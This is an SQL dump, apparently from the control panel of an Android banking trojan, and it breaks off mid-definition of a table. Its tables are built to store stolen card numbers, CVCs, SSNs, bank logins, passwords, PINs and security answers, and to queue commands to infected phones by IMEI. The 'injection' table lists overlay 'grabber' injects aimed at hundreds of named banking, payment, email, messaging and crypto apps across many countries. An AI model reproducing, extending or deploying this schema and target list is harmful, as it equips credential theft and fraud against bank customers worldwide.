-- phpMyAdmin SQL Dump
-- version 4.6.6deb4
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jan 22, 2019 at 11:55 AM
-- Server version: 10.1.37-MariaDB-0+deb9u1
-- PHP Version: 7.0.33-0+deb9u1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `canibase`
--

-- --------------------------------------------------------

--
-- Table structure for table `cc`
--

CREATE TABLE `cc` (
  `id` int(255) UNSIGNED NOT NULL,
  `imei` varchar(20) NOT NULL,
  `country` varchar(10) NOT NULL,
  `typecard` varchar(20) DEFAULT NULL,
  `numbercard` varchar(30) NOT NULL,
  `monthyear` varchar(20) DEFAULT NULL,
  `cvc` varchar(20) DEFAULT NULL,
  `nameholder` varchar(50) DEFAULT NULL,
  `databirth` varchar(50) DEFAULT NULL,
  `postalcode` varchar(20) DEFAULT NULL,
  `addressholder` varchar(100) DEFAULT NULL,
  `phonenumber` varchar(50) DEFAULT NULL,
  `ssn` varchar(50) DEFAULT NULL,
  `accountnumber` varchar(50) DEFAULT NULL,
  `vbv` varchar(20) DEFAULT NULL,
  `SortCode` varchar(20) DEFAULT NULL,
  `timeaddcc` varchar(30) DEFAULT NULL,
  `comments` varchar(3000) DEFAULT NULL,
  `bin` varchar(500) DEFAULT NULL,
  `vbv2` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `commands`
--

CREATE TABLE `commands` (
  `id` int(255) UNSIGNED NOT NULL,
  `IMEI` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `idbotwindows`
--

CREATE TABLE `idbotwindows` (
  `id` int(255) NOT NULL,
  `idbot` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `idbotwindows`
--

INSERT INTO `idbotwindows` (`id`, `idbot`) VALUES
(1, '111'),
(2, '222');

-- --------------------------------------------------------

--
-- Table structure for table `injection`
--

CREATE TABLE `injection` (
  `id` int(60) UNSIGNED NOT NULL,
  `name` varchar(500) NOT NULL,
  `process` varchar(500) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `injection`
--

INSERT INTO `injection` (`id`, `name`, `process`) VALUES
(1, 'Info + Grabber cards', 'grab1,com.whatsapp,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),
(2, 'Info + Grabber cards mini', 'grab3,com.whatsapp,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),
(3, 'Grabber cards', 'grab2,com.whatsapp,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),
(4, 'Grabber cards mini', 'grab4,com.whatsapp,com.tencent.mm,com.ubercab,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android'),
(8, 'Grabber cards Facebook', 'grabfacebook,com.facebook.katana,com.facebook.orca'),
(14, 'Grabber Yahoo', 'yahoo,com.yahoo.mobile.client.android.mail'),
(15, 'Grabber Gmail', 'gmail,com.google.android.gm,com.google.android.apps.inbox'),
(16, 'Grabber mail.com', 'mails_com.mail.mobile.android.mail,com.mail.mobile.android.mail'),
(17, 'Grabber Connect for Hotmail', 'malis_com.connectivityapps.hotmail,com.connectivityapps.hotmail'),
(199, 'com.bestbuy.android', 'com.bestbuy.android,com.bestbuy.android'),
(200, 'PayPal', 'paypal,com.paypal.android.p2pmobile'),
(201, 'Amazon', 'com.amazon.mShop.android.shopping,com.amazon.mShop.android.shopping'),
(202, 'Ebay', 'com.ebay.mobile,com.ebay.mobile'),
(300, '(IT)com.jiffyondemand.user', 'it_com.jiffyondemand.user,com.jiffyondemand.user'),
(301, '(IT)com.latuabancaperandroid', 'it_com.latuabancaperandroid,com.latuabancaperandroid'),
(302, '(IT)com.latuabanca_tabperandroid', 'it_com.latuabanca_tabperandroid,com.latuabanca_tabperandroid'),
(303, '(IT)com.lynxspa.bancopopolare', 'it_com.lynxspa.bancopopolare,com.lynxspa.bancopopolare'),
(304, '(IT)com.unicredit', 'it_com.unicredit,com.unicredit'),
(305, '(IT)it.bnl.apps.banking', 'it_it.bnl.apps.banking,it.bnl.apps.banking'),
(306, '(IT)it.bnl.apps.enterprise.bnlpay', 'it_it.bnl.apps.enterprise.bnlpay,it.bnl.apps.enterprise.bnlpay'),
(307, '(IT)it.bpc.proconl.mbplus', 'it_it.bpc.proconl.mbplus,it.bpc.proconl.mbplus'),
(308, '(IT)it.copergmps.rt.pf.android.sp.bmps', 'it_it.copergmps.rt.pf.android.sp.bmps,it.copergmps.rt.pf.android.sp.bmps'),
(309, '(IT)it.gruppocariparma.nowbanking', 'it_it.gruppocariparma.nowbanking,it.gruppocariparma.nowbanking'),
(310, '(IT)it.ingdirect.app', 'it_it.ingdirect.app,it.ingdirect.app'),
(311, '(IT)it.nogood.container', 'it_it.nogood.container,it.nogood.container'),
(312, '(IT)it.popso.SCRIGNOapp', 'it_it.popso.SCRIGNOapp,it.popso.SCRIGNOapp'),
(313, '(IT)posteitaliane.posteapp.apppostepay', 'it_posteitaliane.posteapp.apppostepay,posteitaliane.posteapp.apppostepay'),
(340, '(CA)com.bmo.mobile', 'ca_com.bmo.mobile,com.bmo.mobile'),
(341, '(CA)com.cibc.android.mobi', 'ca_com.cibc.android.mobi,com.cibc.android.mobi'),
(342, '(CA)com.rbc.mobile.android', 'ca_com.rbc.mobile.android,com.rbc.mobile.android'),
(343, '(CA)com.scotiabank.mobile', 'ca_com.scotiabank.mobile,com.scotiabank.mobile'),
(344, '(CA)com.td', 'ca_com.td,com.td'),
(370, '(US-UK-AU)com.citibank.mobile.au', 'au_citibank,com.citibank.mobile.au,com.citibank.mobile.uk,com.citi.citimobile'),
(371, '(US)com.chase.sig.android', 'us_chase,com.chase.sig.android'),
(372, '(US)com.infonow.bofa', 'us_bofa,com.infonow.bofa,com.bankofamerica.cashpromobile'),
(373, '(US)com.konylabs.capitalone', 'us_capitalone,com.konylabs.capitalone,com.yinzcam.facilities.verizon'),
(374, '(US)com.clairmail.fth', 'us_fifththirdbetter,com.clairmail.fth'),
(375, '(US)com.moneybookers.skrillpayments', 'us_skrill,com.moneybookers.skrillpayments'),
(376, '(US)com.moneybookers.skrillpayments.neteller', 'us_neteller,com.moneybookers.skrillpayments.neteller'),
(377, '(US)com.suntrust.mobilebanking', 'us_suntrust,com.suntrust.mobilebanking'),
(378, '(US)com.usaa.mobile.android.usaa', 'us_usaa,com.usaa.mobile.android.usaa'),
(379, '(US)com.usbank.mobilebanking', 'us_usbank,com.usbank.mobilebanking'),
(380, '(US)com.wf.wellsfargomobile', 'us_wellsfargomobile,com.wf.wellsfargomobile,com.wf.wellsfargomobile.tablet,com.wellsFargo.ceomobile'),
(381, '(US)com.att.myWireless', 'us_com.att.myWireless,com.att.myWireless'),
(382, '(US)com.vzw.hss.myverizon', 'us_com.vzw.hss.myverizon,com.vzw.hss.myverizon'),
(397, '(US)com.jpm.sig.android', 'us_com.jpm.sig.android,com.jpm.sig.android'),
(400, '(ES)es.lacaixa.mobile.android.newwapicon', 'es_es.lacaixa.mobile.android.newwapicon,es.lacaixa.mobile.android.newwapicon'),
(401, '(ES)es.evobanco.bancamovil', 'es_es.evobanco.bancamovil,es.evobanco.bancamovil'),
(402, '(ES)es.bancopopular.nbmpopular', 'es_es.bancopopular.nbmpopular,es.bancopopular.nbmpopular'),
(403, '(ES)com.tecnocom.cajalaboral', 'es_com.tecnocom.cajalaboral,com.tecnocom.cajalaboral'),
(404, '(ES)com.rsi', 'es_com.rsi,com.rsi'),
(405, '(ES)com.kutxabank.android', 'es_com.kutxabank.android,com.kutxabank.android'),
(406, '(ES)com.bankinter.launcher', 'es_com.bankinter.launcher,com.bankinter.launcher'),
(407, '(ES)com.bbva.netcash', 'es_bbvanetcash,com.bbva.netcash'),
(408, '(ES)com.bbva.bbvacontigo', 'es_bbvacontigo,com.bbva.bbvacontigo,com.bbva.bbvawallet'),
(409, '(ES)es.bancosantander.apps', 'es_bancosantander,es.bancosantander.apps,com.santander.app'),
(410, '(ES)es.cm.android', 'es_bankia,es.cm.android,es.cm.android.tablet,com.bankia.wallet'),
(431, '(UK)uk.co.bankofscotland.businessbank', 'uk_bankofscotland,uk.co.bankofscotland.businessbank,com.grppl.android.shell.BOS'),
(432, '(UK)com.rbs.mobile.android.natwestoffshore', 'uk_natwest,com.rbs.mobile.android.natwestoffshore,com.rbs.mobile.android.natwest,com.rbs.mobile.android.natwestbandc'),
(433, '(UK)com.rbs.mobile.investisir', 'uk_royalbankofscotland,com.rbs.mobile.investisir,com.phyder.engage,com.rbs.mobile.android.rbs,com.rbs.mobile.android.rbsbandc'),
(434, '(UK-US)uk.co.santander.santanderUK', 'uk_santander,uk.co.santander.santanderUK,uk.co.santander.businessUK.bb,com.sovereign.santander'),
(435, '(UK)com.ifs.banking.fiid4202', 'uk_tsb,com.ifs.banking.fiid4202,com.fi6122.godough'),
(436, '(UK)com.rbs.mobile.android.ubr', 'uk_ulster,com.rbs.mobile.android.ubr'),
(437, '(UK-US)com.htsu.hsbcpersonalbanking', 'uk_hsbc,com.htsu.hsbcpersonalbanking'),
(438, '(UK)com.grppl.android.shell.halifax', 'uk_halifax,com.grppl.android.shell.halifax'),
(439, '(UK)com.grppl.android.shell.CMBlloydsTSB73', 'uk_csgcsdnmb,com.grppl.android.shell.CMBlloydsTSB73'),
(440, '(UK)com.barclays.android.barclaysmobilebanking', 'uk_barclays,com.barclays.android.barclaysmobilebanking'),
(490, '(NL)com.ing.mobile', 'nl_ing.mobile,com.ing.mobile'),
(491, '(NL)com.abnamro.nl.mobile.payments', 'nl_com.abnamro.nl.mobile.payments,com.abnamro.nl.mobile.payments'),
(492, '(NL)com.triodos.bankingnl', 'nl_com.triodos.bankingnl,com.triodos.bankingnl'),
(493, '(NL)nl.asnbank.asnbankieren', 'nl_nl.asnbank.asnbankieren,nl.asnbank.asnbankieren'),
(494, '(NL)nl.snsbank.mobielbetalen', 'nl_nl.snsbank.mobielbetalen,nl.snsbank.mobielbetalen'),
(513, '(IN)com.unionbank.ecommerce.mobile.android', 'in_unionbank.ecommerce.mobile.android,com.unionbank.ecommerce.mobile.android,com.unionbank.ecommerce.mobile.commercial.legacy'),
(514, '(IN)com.snapwork.IDBI', 'in_src.com.idbi,com.snapwork.IDBI,src.com.idbi,com.idbi.mpassbook,com.idbibank.abhay_card'),
(515, '(IN)com.snapwork.hdfc', 'in_snapwork.hdfc,com.snapwork.hdfc'),
(516, '(IN)com.sbi.SBIFreedomPlus', 'in_sbi.SBFreedom,com.sbi.SBIFreedomPlus'),
(517, '(IN)hdfcbank.hdfcquickbank', 'in_hdfcbank.hdfcquickbank,hdfcbank.hdfcquickbank'),
(518, '(IN)com.csam.icici.bank.imobile', 'in_csam.icici.bank.imobile,com.csam.icici.bank.imobile'),
(519, '(IN)in.co.bankofbaroda.mpassbook', 'in_co.bankofbaroda.mpassbook,in.co.bankofbaroda.mpassbook'),
(520, '(IN)com.axis.mobile', 'in_axis,com.axis.mobile'),
(521, '(IN)com.infrasofttech.indianBank', 'in_com.infrasofttech.indianBank,com.infrasofttech.indianBank'),
(522, '(IN)com.mobikwik_new', 'in_com.mobikwik_new,com.mobikwik_new'),
(523, '(IN)com.oxigen.oxigenwallet', 'in_com.oxigen.oxigenwallet,com.oxigen.oxigenwallet'),
(565, '(CZ)eu.inmite.prj.kb.mobilbank', 'cz_eu.inmite.prj.kb.mobilbank,eu.inmite.prj.kb.mobilbank'),
(566, '(CZ)cz.airbank.android', 'cz_cz.airbank.android,cz.airbank.android'),
(567, '(CZ)sk.sporoapps.accounts', 'cz_sksporoapps,sk.sporoapps.accounts,sk.sporoapps.skener'),
(568, '(CZ)cz.csob.smartbanking', 'cz_csobSmartbanking,cz.csob.smartbanking'),
(569, '(CZ)cz.sberbankcz', 'cz_sberbankcz,cz.sberbankcz'),
(570, '(CZ)com.cleverlance.csas.servis24', 'cz_cleverlanceCsasServis24,com.cleverlance.csas.servis24'),
(602, '(AU)org.westpac.bank,nz.co.westpac', 'au_WestpacBank,org.westpac.bank,nz.co.westpac'),
(603, '(AU)au.com.suncorp.SuncorpBank', 'au_SuncorpBank,au.com.suncorp.SuncorpBank'),
(604, '(AU)org.stgeorge.bank', 'au_stgeorge.Bank,org.stgeorge.bank'),
(605, '(AU)org.banksa.bank', 'au_orgBanksaBank,org.banksa.bank'),
(607, '(AU)au.com.newcastlepermanent', 'au_newcastlepermanent,au.com.newcastlepermanent'),
(608, '(AU)au.com.nab.mobile', 'au_nab,au.com.nab.mobile'),
(609, '(AU)au.com.mebank.banking', 'au_mebank,au.com.mebank.banking'),
(610, '(AU)au.com.ingdirect.android', 'au_ingdirect,au.com.ingdirect.android,MyING.be'),
(611, '(AU)com.imb.banking2', 'au_imb.banking,com.imb.banking2'),
(612, '(AU)com.fusion.ATMLocator', 'au_fusionATMLocator,com.fusion.ATMLocator'),
(613, '(AU)au.com.cua.mb', 'au_cua,au.com.cua.mb'),
(614, '(AU)com.commbank.netbank', 'au_commbank,com.commbank.netbank,com.cba.android.netbank'),
(616, '(AU)org.bom.bank', 'au_bomBank,org.bom.bank'),
(617, '(AU)com.bendigobank.mobile', 'au_bendigobank,com.bendigobank.mobile,me.doubledutch.hvdnz.cbnationalconference2016'),
(618, '(AU)au.com.bankwest.mobile', 'au_bankwest,au.com.bankwest.mobile'),
(619, '(AU)com.bankofqueensland.boq', 'au_bankofqueenslandBOQ,com.bankofqueensland.boq'),
(620, '(AU)com.anz.android.gomoney', 'au_anzSingaporeDigitalBanking,com.anz.android.gomoney,com.anz.android,com.anz.SingaporeDigitalBanking,com.anzspot.mobile,com.crowdcompass.appSQ0QACAcYJ,com.arubanetworks.atmanz,com.quickmobile.anzirevents15'),
(674, '(AT)com.bankaustria.android.olb', 'at_com.bankaustria.android.olb,com.bankaustria.android.olb'),
(675, '(AT)at.spardat.netbanking', 'at_at.spardat.netbanking,at.spardat.netbanking'),
(676, '(AT)at.spardat.bcrmobile', 'at_at.spardat.bcrmobile,at.spardat.bcrmobile'),
(677, '(AT)at.volksbank.volksbankmobile', 'at_volksbank,at.volksbank.volksbankmobile,de.fiducia.smartphone.android.banking.vr,it.volksbank.android,it.secservizi.mobile.atime.bpaa,de.fiducia.smartphone.android.securego.vr'),
(678, '(AT)com.isis_papyrus.raiffeisen_pay_eyewdg', 'at_raiffeisen,com.isis_papyrus.raiffeisen_pay_eyewdg'),
(679, '(AT)at.easybank.mbanking', 'at_easybank,at.easybank.mbanking,at.easybank.tablet,at.easybank.securityapp'),
(680, '(AT)at.bawag.mbanking', 'at_bawag,at.bawag.mbanking,com.bawagpsk.securityapp,at.psa.app.bawag'),
(734, '(TR)com.akbank.android.apps.akbank_direkt', 'tr_akbank,com.akbank.android.apps.akbank_direkt,com.akbank.android.apps.akbank_direkt_tablet,com.akbank.softotp,com.mobilike.cepbutcem,akbank.yatirimci.mobile'),
(735, '(TR)com.finansbank.mobile.cepsube', 'tr_qnb_finansbank,com.finansbank.mobile.cepsube,finansbank.enpara,com.magiclick.FinansPOS,com.matriksdata.finansyatirim,finansbank.enpara.sirketim,com.vipera.ts.starter.QNB,com.QNBAlAhli,com.qnbbank.mobile'),
(736, '(TR)com.garanti.cepsubesi', 'tr_garantibank,com.garanti.cepsubesi,com.garanti.cepbank,com.garantibank.cepsubesiro,biz.mobinex.android.apps.cep_sifrematik,com.garantiemeklilik.cepsube,garanti.etrader'),
(737, '(TR)com.tmobtech.halkbank', 'tr_halkbank,com.tmobtech.halkbank,com.SifrebazCep,eu.newfrontier.iBanking.mobile.Halk.Retail,rs.telnet.cacanskabankadroid,halkcorporate.mk'),
(738, '(TR)com.softtech.isbankasi', 'tr_isbank,com.softtech.isbankasi,com.yurtdisi.iscep,com.softtech.iscek,com.monitise.isbankmoscow'),
(739, '(TR)com.ykb.android', 'tr_yapikredi,com.ykb.android,com.ykb.android.mobilonay,com.ykb.avm,com.ykb.androidtablet,com.veripark.ykbaz'),
(740, '(TR)com.ziraat.ziraatmobil', 'tr_ziraatbanksi,com.ziraat.ziraatmobil,com.ziraat.ziraattablet,com.matriksmobile.android.ziraatTrader'),
(741, '(TR)com.pozitron.iscep', 'tr_pozitron.iscep,com.pozitron.iscep'),
(742, '(TR)com.vakifbank.mobile', 'tr_vakifbank,com.vakifbank.mobile,com.pozitron.vakifbank'),
(743, '(TR)com.btcturk', 'tr_com.btcturk,com.btcturk'),
(744, '(TR)com.finansbank.mobile.cepsube', 'tr_com.finansbank.mobile.cepsube,com.finansbank.mobile.cepsube'),
(745, '(TR)com.ingbanktr.ingmobil', 'tr_com.ingbanktr.ingmobil,com.ingbanktr.ingmobil'),
(746, '(TR)com.kuveytturk.mobil', 'tr_com.kuveytturk.mobil,com.kuveytturk.mobil'),
(747, '(TR)com.magiclick.odeabank', 'tr_com.magiclick.odeabank,com.magiclick.odeabank'),
(748, '(TR)com.mobillium.papara', 'tr_com.mobillium.papara,com.mobillium.papara'),
(749, '(TR)com.pozitron.albarakaturk', 'tr_com.pozitron.albarakaturk,com.pozitron.albarakaturk'),
(750, '(TR)com.teb', 'tr_com.teb,com.teb'),
(751, '(TR)com.tmob.denizbank', 'tr_com.tmob.denizbank,com.tmob.denizbank'),
(753, '(TR)finansbank.enpara', 'tr_finansbank.enpara,finansbank.enpara'),
(754, '(TR)tr.com.hsbc.hsbcturkey', 'tr_tr.com.hsbc.hsbcturkey,tr.com.hsbc.hsbcturkey'),
(755, '(TR)tr.com.sekerbilisim.mbank', 'tr_tr.com.sekerbilisim.mbank,tr.com.sekerbilisim.mbank'),
(790, '(DE)com.starfinanz.smob.android.sfinanzstatus', 'de_spadrat,com.starfinanz.smob.android.sfinanzstatus,com.starfinanz.mobile.android.pushtan,com.entersekt.authapp.sparkasse,com.starfinanz.smob.android.sfinanzstatus.tablet'),
(791, '(DE)de.comdirect.android', 'de_Comdirect,de.comdirect.android'),
(792, '(DE)de.commerzbanking.mobil', 'de_CommerzBank,de.commerzbanking.mobil'),
(793, '(DE)de.consorsbank', 'de_Consorsbank,de.consorsbank'),
(794, '(DE)com.db.mm.deutschebank', 'de_DeutscheBank,com.db.mm.deutschebank'),
(795, '(DE)de.dkb.portalapp', 'de_DKB,de.dkb.portalapp,com.de.dkb.portalapp'),
(796, '(DE)com.ing.diba.mbbr2', 'de_ING_DiBa,com.ing.diba.mbbr2'),
(797, '(DE)de.postbank.finanzassistent', 'de_Postbank,de.postbank.finanzassistent'),
(798, '(DE)mobile.santander.de', 'de_Santander,mobile.santander.de'),
(799, '(DE)com.starfinanz.smob.android.sbanking', 'de_Sparkasse,com.starfinanz.smob.android.sbanking'),
(800, '(DE)de.fiducia.smartphone.android.banking.vr', 'de_Volksbank,de.fiducia.smartphone.android.banking.vr'),
(801, '(DE)com.db.mm.norisbank', 'de_com.db.mm.norisbank,com.db.mm.norisbank'),
(802, '(DE)com.db.pwcc.dbmobile', 'de_com.db.pwcc.dbmobile,com.db.pwcc.dbmobile'),
(803, '(DE)com.targo_prod.bad', 'de_com.targo_prod.bad,com.targo_prod.bad'),
(804, '(DE)eu.unicreditgroup.hvbapptan', 'de_eu.unicreditgroup.hvbapptan,eu.unicreditgroup.hvbapptan'),
(870, '(FR)com.palatine.android.mobilebanking.prod', 'fr_palatine,com.palatine.android.mobilebanking.prod'),
(871, '(FR)fr.laposte.lapostemobile', 'fr_laposte,fr.laposte.lapostemobile,fr.laposte.lapostetablet'),
(872, '(FR)com.cm_prod.bad', 'fr_cmprodfr,com.cm_prod.bad,com.cm_prod.epasal,com.cm_prod_tablet.bad,com.cm_prod.nosactus'),
(873, '(FR)fr.creditagricole.androidapp', 'fr_agricole,fr.creditagricole.androidapp'),
(874, '(FR)fr.axa.monaxa', 'fr_axa,fr.axa.monaxa'),
(875, '(FR)fr.banquepopulaire.cyberplus', 'fr_BanquePopulaire,fr.banquepopulaire.cyberplus'),
(876, '(FR)net.bnpparibas.mescomptes', 'fr_BNPParibas,net.bnpparibas.mescomptes'),
(877, '(FR)com.boursorama.android.clients', 'fr_Boursorama,com.boursorama.android.clients'),
(878, '(FR)com.caisseepargne.android.mobilebanking', 'fr_CaisseEpargne,com.caisseepargne.android.mobilebanking'),
(879, '(FR)fr.lcl.android.customerarea', 'fr_LCL,fr.lcl.android.customerarea'),
(880, '(FR)mobi.societegenerale.mobile.lappli', 'fr_SocieteGenerale,mobi.societegenerale.mobile.lappli'),
(1010, '(HK)com.bochk.com', 'hk_com.bochk.com,com.bochk.com'),
(1011, '(HK)com.dbs.hk.dbsmbanking', 'hk_com.dbs.hk.dbsmbanking,com.dbs.hk.dbsmbanking'),
(1012, '(HK)com.FubonMobileClient', 'hk_com.FubonMobileClient,com.FubonMobileClient'),
(1013, '(HK)com.FubonMobileClient', 'hk_com.hangseng.rbmobile,com.hangseng.rbmobile'),
(1014, '(HK)com.MobileTreeApp', 'hk_com.MobileTreeApp,com.MobileTreeApp'),
(1015, '(HK)com.mtel.androidbea', 'hk_com.mtel.androidbea,com.mtel.androidbea'),
(1016, '(HK)com.mtel.androidbea', 'hk_com.scb.breezebanking.hk,com.scb.breezebanking.hk'),
(1017, '(HK)hk.com.hsbc.hsbchkmobilebanking', 'hk_hk.com.hsbc.hsbchkmobilebanking,hk.com.hsbc.hsbchkmobilebanking'),
(1025, '(HU)com.aff.otpdirekt', 'hu_com.aff.otpdirekt,com.aff.otpdirekt'),
(1035, '(IL)com.ideomobile.hapoalim', 'il_com.ideomobile.hapoalim,com.ideomobile.hapoalim'),
(1045, '(JP)jp.co.aeonbank.android.passbook', 'jp_jp.co.aeonbank.android.passbook,jp.co.aeonbank.android.passbook'),
(1046, '(JP)jp.co.netbk', 'jp_jp.co.netbk,jp.co.netbk'),
(1047, '(JP)jp.co.rakuten_bank.rakutenbank', 'jp_jp.co.rakuten_bank.rakutenbank,jp.co.rakuten_bank.rakutenbank'),
(1048, '(JP)jp.co.sevenbank.AppPassbook', 'jp_jp.co.sevenbank.AppPassbook,jp.co.sevenbank.AppPassbook'),
(1049, '(JP)jp.co.smbc.direct', 'jp_jp.co.smbc.direct,jp.co.smbc.direct'),
(1050, '(JP)jp.mufg.bk.applisp.app', 'jp_jp.mufg.bk.applisp.app,jp.mufg.bk.applisp.app'),
(1060, '(KE)com.barclays.ke.mobile.android.ui', 'ke_com.barclays.ke.mobile.android.ui,com.barclays.ke.mobile.android.ui'),
(1070, '(NZ)nz.co.anz.android.mobilebanking', 'nz_nz.co.anz.android.mobilebanking,nz.co.anz.android.mobilebanking'),
(1071, '(NZ)nz.co.asb.asbmobile', 'nz_nz.co.asb.asbmobile,nz.co.asb.asbmobile'),
(1072, '(NZ)nz.co.bnz.droidbanking', 'nz_nz.co.bnz.droidbanking,nz.co.bnz.droidbanking'),
(1073, '(NZ)nz.co.kiwibank.mobile', 'nz_nz.co.kiwibank.mobile,nz.co.kiwibank.mobile'),
(1085, '(PL)com.getingroup.mobilebanking', 'pl_com.getingroup.mobilebanking,com.getingroup.mobilebanking'),
(1086, '(PL)eu.eleader.mobilebanking.pekao.firm', 'pl_eu.eleader.mobilebanking.pekao.firm,eu.eleader.mobilebanking.pekao.firm'),
(1087, '(PL)eu.eleader.mobilebanking.pekao', 'pl_eu.eleader.mobilebanking.pekao,eu.eleader.mobilebanking.pekao'),
(1088, '(PL)eu.eleader.mobilebanking.raiffeisen', 'pl_eu.eleader.mobilebanking.raiffeisen,eu.eleader.mobilebanking.raiffeisen'),
(1089, '(PL)pl.bzwbk.bzwbk24', 'pl_pl.bzwbk.bzwbk24,pl.bzwbk.bzwbk24'),
(1090, '(PL)pl.ipko.mobile', 'pl_pl.ipko.mobile,pl.ipko.mobile'),
(1091, '(PL)pl.mbank', 'pl_pl.mbank,pl.mbank'),
(1092, '(PL)alior.bankingapp.android', 'pl_alior.bankingapp.android,alior.bankingapp.android'),
(1093, '(PL)com.comarch.mobile.banking.bgzbnpparibas.biznes', 'pl_com.comarch.mobile.banking.bgzbnpparibas.biznes,com.comarch.mobile.banking.bgzbnpparibas.biznes'),
(1094, '(PL)com.comarch.security.mobilebanking', 'pl_com.comarch.security.mobilebanking,com.comarch.security.mobilebanking'),
(1095, '(PL)com.empik.empikapp', 'pl_com.empik.empikapp,com.empik.empikapp'),
(1096, '(PL)com.empik.empikfoto', 'pl_com.empik.empikfoto,com.empik.empikfoto'),
(1097, '(PL)com.finanteq.finance.ca', 'pl_com.finanteq.finance.ca,com.finanteq.finance.ca'),
(1098, '(PL)com.orangefinanse', 'pl_com.orangefinanse,com.orangefinanse'),
(1099, '(PL)eu.eleader.mobilebanking.invest', 'pl_eu.eleader.mobilebanking.invest,eu.eleader.mobilebanking.invest'),
(1100, '(PL)pl.aliorbank.aib', 'pl_pl.aliorbank.aib,pl.aliorbank.aib'),
(1101, '(PL)pl.allegro', 'pl_pl.allegro,pl.allegro'),
(1102, '(PL)pl.bosbank.mobile', 'pl_pl.bosbank.mobile,pl.bosbank.mobile'),
(1103, '(PL)pl.bph', 'pl_pl.bph,pl.bph'),
(1104, '(PL)pl.bps.bankowoscmobilna', 'pl_pl.bps.bankowoscmobilna,pl.bps.bankowoscmobilna'),
(1105, '(PL)pl.bzwbk.ibiznes24', 'pl_pl.bzwbk.ibiznes24,pl.bzwbk.ibiznes24'),
(1106, '(PL)pl.bzwbk.mobile.tab.bzwbk24', 'pl_pl.bzwbk.mobile.tab.bzwbk24,pl.bzwbk.mobile.tab.bzwbk24'),
(1107, '(PL)pl.ceneo', 'pl_pl.ceneo,pl.ceneo'),
(1108, '(PL)pl.com.rossmann.centauros', 'pl_pl.com.rossmann.centauros,pl.com.rossmann.centauros'),
(1109, '(PL)pl.fmbank.smart', 'pl_pl.fmbank.smart,pl.fmbank.smart'),
(1110, '(PL)pl.ideabank.mobilebanking', 'pl_pl.ideabank.mobilebanking,pl.ideabank.mobilebanking'),
(1111, '(PL)pl.ing.mojeing', 'pl_pl.ing.mojeing,pl.ing.mojeing'),
(1112, '(PL)pl.millennium.corpApp', 'pl_pl.millennium.corpApp,pl.millennium.corpApp'),
(1113, '(PL)pl.orange.mojeorange', 'pl_pl.orange.mojeorange,pl.orange.mojeorange'),
(1114, '(PL)pl.pkobp.iko', 'pl_pl.pkobp.iko,pl.pkobp.iko'),
(1115, '(PL)pl.pkobp.ipkobiznes', 'pl_pl.pkobp.ipkobiznes,pl.pkobp.ipkobiznes'),
(1116, '(PL)wit.android.bcpBankingApp.millenniumPL', 'pl_wit.android.bcpBankingApp.millenniumPL,wit.android.bcpBankingApp.millenniumPL'),
(1145, '(RO)com.advantage.RaiffeisenBank', 'ro_com.advantage.RaiffeisenBank,com.advantage.RaiffeisenBank'),
(1146, '(RO)hr.asseco.android.jimba.mUCI.ro', 'ro_hr.asseco.android.jimba.mUCI.ro,hr.asseco.android.jimba.mUCI.ro'),
(1147, '(RO)may.maybank.android', 'ro_may.maybank.android,may.maybank.android'),
(1148, '(RO)ro.btrl.mobile', 'ro_ro.btrl.mobile,ro.btrl.mobile'),
(1150, '(Crypt)piuk.blockchain.android', 'blockchaine,piuk.blockchain.android,info.blockchain.merchant'),
(1151, '(Crypt)com.coinbase.android', 'com.coinbase.android,com.coinbase.android,com.portfolio.coinbase_tracker'),
(1152, '(Crypt)com.unocoin.unocoinwallet', 'com.unocoin.unocoinwallet,com.unocoin.unocoinwallet,com.unocoin.unocoinmerchantPoS'),
(1153, '(Crypt)com.localbitcoinsmbapp', 'localbitcoin,com.localbitcoinsmbapp,com.thunkable.android.manirana54.LocalBitCoins,com.thunkable.android.manirana54.LocalBitCoins_unblock,com.localbitcoins.exchange,com.coins.bit.local,com.coins.ful.bit,com.jamalabbasii1998.localbitcoin'),
(1154, '(Crypt)zebpay.Application', 'zebpay,zebpay.Application'),
(1155, '(Crypt)com.binance.dev', 'tr_com.binance.dev,com.binance.dev'),
(1156, '(Crypt)com.bitfinex.bfxapp', 'com.bitfinex.bfxapp,com.bitfinex.bfxapp'),
(1157, '(Crypt)com.mycelium.wallet', 'com.mycelium.wallet,com.mycelium.wallet'),
(1158, '(Crypt)com.bitmarket.trader', 'com.bitmarket.trader,com.bitmarket.trader'),
(1159, '(Crypt)com.plunien.poloniex', 'com.plunien.poloniex,com.plunien.poloniex'),
(1160, '(Crypt)com.Plus500', 'com.Plus500,com.Plus500');

-- --------------------------------------------------------

--
-- Table structure for table `injs`
--

CREATE TABLE `injs` (
  `id` int(255) NOT NULL,
  `idbot` varchar(200) NOT NULL,
  `name` varchar(300) NOT NULL,
  `country` varchar(10) DEFAULT NULL,
  `login` varchar(300) DEFAULT NULL,
  `password` varchar(300) DEFAULT NULL,
  `pin` varchar(300) DEFAULT NULL,
  `comments` varchar(2500) DEFAULT NULL,
  `params1` varchar(100) DEFAULT NULL,
  `params2` varchar(100) DEFAULT NULL,
  `vopros1` varchar(100) DEFAULT NULL,
  `vopros2` varchar(100) DEFAULT NULL,
  `otvet1` varchar(100) DEFAULT NULL,
  `cc` varchar(50) DEFAULT NULL,
  `monthyear` varchar(50) DEFAULT NULL,
